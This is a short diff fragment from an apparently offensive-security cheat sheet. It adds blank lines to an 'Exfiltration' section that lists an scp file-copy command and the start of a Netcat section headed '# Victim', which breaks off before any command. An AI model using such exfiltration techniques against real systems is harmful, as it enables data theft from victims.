@@ -74,11 +74,13 @@ msbuild [src.sln]
 ## Exfiltration
 
 - SSH Copy (scp)
+
 ```bash
 scp user@hostname:/path/to/src user@hostname:/path/to/dst
 ```
 
 - Netcat
+
 ```bash
 
 # Victim
